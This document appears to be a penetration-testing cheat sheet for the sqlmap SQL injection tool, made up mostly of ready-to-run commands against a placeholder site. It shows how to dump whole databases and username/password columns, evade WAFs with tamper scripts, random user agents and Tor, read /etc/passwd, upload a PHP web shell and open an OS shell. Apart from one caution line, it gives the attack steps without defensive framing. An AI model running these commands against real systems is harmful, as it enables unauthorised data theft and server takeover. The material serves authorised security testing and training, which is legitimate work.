# SQLMap

Automatic SQL injection and database takeover tool.

## Basic Usage

```bash
# Test URL with parameter
sqlmap -u "http://target.com/page.php?id=1"

# Test from Burp request file
sqlmap -r request.txt
```

---

## Target Specification

| Option | Description |
|:-------|:------------|
| `-u <URL>` | Target URL with parameter |
| `-r <file>` | Load request from file (Burp) |
| `-g <dork>` | Google dork target |
| `--data=<data>` | POST data |
| `--cookie=<cookie>` | HTTP cookie |

```bash
# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# With cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc123"

# Custom headers
sqlmap -u "http://target.com/api?id=1" -H "Authorization: Bearer token"
```

---

## Detection Options

| Option | Description |
|:-------|:------------|
| `--level=<1-5>` | Test thoroughness (default: 1) |
| `--risk=<1-3>` | Risk of tests (default: 1) |
| `-p <param>` | Specific parameter to test |
| `--dbms=<dbms>` | Force specific DBMS |

```bash
# More thorough testing
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# Test specific parameter
sqlmap -u "http://target.com/page?id=1&cat=2" -p id

# Specify database type
sqlmap -u "http://target.com/page?id=1" --dbms=mysql
```

---

## Enumeration

### Database Information
```bash
# Get current database
sqlmap -u "http://target.com/page?id=1" --current-db

# Get current user
sqlmap -u "http://target.com/page?id=1" --current-user

# Check if DBA
sqlmap -u "http://target.com/page?id=1" --is-dba

# List all databases
sqlmap -u "http://target.com/page?id=1" --dbs
```

### Tables and Columns
```bash
# List tables in database
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# List columns in table
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --columns

# Dump table data
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C username,password --dump
```

---

## Advanced Options

### Bypass WAF/Filters
```bash
# Use tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment

# Multiple tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,randomcase

# List tamper scripts
sqlmap --list-tampers
```

**Common Tamper Scripts:**
| Script | Description |
|:-------|:------------|
| `space2comment` | Replace spaces with /**/ |
| `randomcase` | Random upper/lowercase |
| `between` | Replace > with NOT BETWEEN |
| `charencode` | URL encode |
| `base64encode` | Base64 encode |

### Evasion
```bash
# Random user agent
sqlmap -u "http://target.com/page?id=1" --random-agent

# Delay between requests
sqlmap -u "http://target.com/page?id=1" --delay=2

# Tor proxy
sqlmap -u "http://target.com/page?id=1" --tor
```

---

## OS Interaction

> [!CAUTION]
> These commands are very intrusive. Use only with explicit permission.

```bash
# Read file from server
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# Write file to server
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Get OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# SQL shell
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

---

## Technique Selection

| Option | Description |
|:-------|:------------|
| `--technique=<tech>` | Specify injection techniques |

**Techniques:**
| Code | Technique |
|:-----|:----------|
| `B` | Boolean-based blind |
| `E` | Error-based |
| `U` | UNION query |
| `S` | Stacked queries |
| `T` | Time-based blind |
| `Q` | Inline queries |

```bash
# Only use UNION and error-based
sqlmap -u "http://target.com/page?id=1" --technique=EU
```

---

## Batch Mode (Non-Interactive)

```bash
# Auto-answer yes to prompts
sqlmap -u "http://target.com/page?id=1" --batch

# Full auto scan and dump
sqlmap -u "http://target.com/page?id=1" --batch --dbs --dump-all
```

---

## Examples

```bash
# Quick vulnerability check
sqlmap -u "http://target.com/page?id=1" --batch

# Full database dump
sqlmap -u "http://target.com/page?id=1" --dbs --dump-all --batch

# Get shell
sqlmap -u "http://target.com/page?id=1" --os-shell --batch

# From Burp request with higher level
sqlmap -r request.txt --level=5 --risk=3 --batch
```

---

## Workflow

```
1. Identify potential injection point
2. Test with basic scan: sqlmap -u "URL" --batch
3. If vulnerable, enumerate: --dbs
4. Get tables: -D dbname --tables
5. Get columns: -D dbname -T tablename --columns
6. Dump data: -D dbname -T tablename --dump
```
